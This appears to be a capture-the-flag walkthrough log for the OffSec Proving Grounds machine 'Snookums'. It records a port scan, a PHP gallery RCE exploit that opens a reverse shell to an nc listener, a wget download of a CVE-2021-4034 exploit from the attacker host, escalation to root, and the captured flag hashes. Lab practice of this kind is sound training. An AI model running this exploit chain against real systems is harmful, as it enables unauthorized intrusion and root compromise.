参考资料  
[https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Snookums.md](https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Snookums.md)
 
┌──(kali㉿kali)-[~/Desktop/pg03/Snookums]  
└─$ nmap -sS 192.168.178.58  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2026-01-02 04:29 EST  
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 0.65% done  
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 1.00% done; ETC: 04:29 (0:00:00 remaining)  
Nmap scan report for 192.168.178.58  
Host is up (0.21s latency).  
Not shown: 993 filtered tcp ports (no-response)  
PORT STATE SERVICE  
21/tcp open ftp  
22/tcp open ssh  
80/tcp open http  
111/tcp open rpcbind  
139/tcp open netbios-ssn  
445/tcp open microsoft-ds  
3306/tcp open mysql
 
Nmap done: 1 IP address (1 host up) scanned in 10.66 seconds   ┌──(kali㉿kali)-[~/Desktop/pg03/Snookums]  
└─$
    
python3 SimplePHPGal-RCE.py [http://192.168.236.58/](http://192.168.236.58/) 192.168.45.236 445
    
guocheng  
┌──(kali㉿kali)-[~/Desktop/pg03/Snookums]  
└─$ rlwrap -cAr nc -nvlp445  
listening on [any] 445 ...  
connect to [192.168.45.236] from (UNKNOWN) [192.168.236.58] 38546  
SOCKET: Shell has connected! PID: 2007
    
ls  
README.txt  
UpgradeInstructions.txt  
css  
db.php  
embeddedGallery.php  
functions.php  
image.php  
images  
index.php  
js  
license.txt  
photos  
phpGalleryConfig.php  
phpGalleryStyle-RED.css  
phpGalleryStyle.css  
phpGallery_images  
phpGallery_thumbs  
thumbnail_generator.php  
python -c 'import pty; pty.spawn("/bin/bash")'  
bash-4.2$ ls  
ls  
README.txt image.php phpGalleryConfig.php  
UpgradeInstructions.txt images phpGalleryStyle-RED.css  
css index.php phpGalleryStyle.css  
db.php js phpGallery_images  
embeddedGallery.php license.txt phpGallery_thumbs  
functions.php photos thumbnail_generator.php  
bash-4.2$ cd /tmp  
cd /tmp  
bash-4.2$ ls  
ls  
bash-4.2$ wget [http://192.168.45.236/CVE-2021-4034/CVE-2021-4034.py](http://192.168.45.236/CVE-2021-4034/CVE-2021-4034.py)  
wget [http://192.168.45.236/CVE-2021-4034/CVE-2021-4034.py](http://192.168.45.236/CVE-2021-4034/CVE-2021-4034.py)  
--2026-01-04 04:38:19-- [http://192.168.45.236/CVE-2021-4034/CVE-2021-4034.py](http://192.168.45.236/CVE-2021-4034/CVE-2021-4034.py)  
Connecting to 192.168.45.236:80... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 3262 (3.2K) [text/x-python]  
Saving to: 'CVE-2021-4034.py'
 
100%[======================================\>] 3,262 --.-K/s in 0s
 
2026-01-04 04:38:19 (729 MB/s) - 'CVE-2021-4034.py' saved [3262/3262]
 
bash-4.2$ ls  
ls  
CVE-2021-4034.py  
bash-4.2$ python CVE-2021-4034.py  
python CVE-2021-4034.py  
[+] Creating shared library for exploit code.  
[+] Calling execve()  
[root@snookums tmp]# cd /root  
cd /root  
[root@snookums root]# ls  
ls  
proof.txt  
[root@snookums root]# cd /home  
cd /home  
[root@snookums home]# ls  
ls  
michael  
[root@snookums home]# cd michael  
cd michael  
[root@snookums michael]# ls  
ls  
local.txt  
[root@snookums michael]# cat local.txt  
cat local.txt  
05dd6094101b8e4d94ce414091a6b072  
[root@snookums michael]# cd /root  
ls  
cd /root  
[root@snookums root]# ls  
proof.txt  
[root@snookums root]# cat proof.txt  
cat proof.txt  
f015c697e92ce04e8cfc991de396a79e  
[root@snookums root]#
 
注意有时候local proof的顺序可能是不一样的 不要有惯性的思维，要有灵活思维